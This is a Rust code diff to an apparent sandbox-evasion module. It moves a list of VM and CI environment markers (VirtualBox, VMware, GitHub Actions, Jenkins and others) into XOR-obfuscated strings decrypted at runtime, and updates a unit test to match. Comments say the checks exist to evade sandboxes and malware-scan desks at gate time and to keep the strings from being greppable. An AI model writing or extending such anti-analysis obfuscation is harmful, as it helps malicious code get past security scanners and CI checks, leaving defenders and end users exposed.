@@ -18,19 +18,21 @@ const MIN_CPUS: usize = 2;
 /// greppable by analysts — but the analyst is not the thing we're evading
 /// at gate time; the sandboxis. Actually the analyst is, but only at
 /// reverse time; by then the binary is already look-at-me. Keep them.
-const VM_ENV_HINTS: &[&str] = &[
-    // hypervisor / VM tooling paths often leak into the environment
-    "VBOX_",
-    "VMWARE_",
-    "VIRTUALBOX",
-    // CI sandboxes that run every upload (malware-scan desks run here)
-    "CI",
-    "TF_BUILD",
-    "GITHUB_ACTIONS",
-    "GITLAB_CI",
-    "JENKINS_URL",
-    "TEAMCITY_VERSION",
-];
+///
+/// The VM/CI environment markers as runtime-decrypted strings.
+fn vm_env_hints() -> Vec<String> {
+    vec![
+        crate::x!("VBOX_", 0x61),
+        crate::x!("VMWARE_", 0xA8),
+        crate::x!("VIRTUALBOX", 0x3D),
+        crate::x!("CI", 0x77),
+        crate::x!("TF_BUILD", 0x19),
+        crate::x!("GITHUB_ACTIONS", 0x4C),
+        crate::x!("GITLAB_CI", 0x2E),
+        crate::x!("JENKINS_URL", 0x90),
+        crate::x!("TEAMCITY_VERSION", 0x57),
+    ]
+}
 
 /// Human-useful: does the current process *look* sandboxed?
 ///
@@ -43,7 +45,8 @@ pub fn looks_sandboxed() -> bool {
 
 /// Scans the process environment for VM/CI markers. Pure, no OS calls.
 fn has_vm_env_hint() -> bool {
-    VM_ENV_HINTS.iter().any(|h| {
+    let hints = vm_env_hints();
+    hints.iter().any(|h| {
         std::env::vars_os().any(|(k, _)| k.to_string_lossy().to_ascii_uppercase().contains(h))
     })
 }
@@ -86,10 +89,15 @@ mod tests {
     #[test]
     fn empty_runtime_env_finds_no_vm_hint() {
         // The test process env is inherited; we can't clear it, but we can
-        // assert the *default* VM_ENV_HINTS does not include everyday vars.
-        for hint in VM_ENV_HINTS {
-            assert!(!hint.is_empty(), "no empty hints");
-        }
+        // assert the *default* marker set decrypts to non-empty, plain-ASCII.
+        let hints = vm_env_hints();
+        assert!(
+            hints.iter().all(|h| !h.is_empty() && h.is_ascii()),
+            "no empty/non-ASCII hints"
+        );
+        // The decrypted markers must match the documented plain list.
+        assert!(hints.iter().any(|h| h == "GITHUB_ACTIONS"));
+        assert!(hints.iter().any(|h| h == "VBOX_"));
     }
 
     #[test]
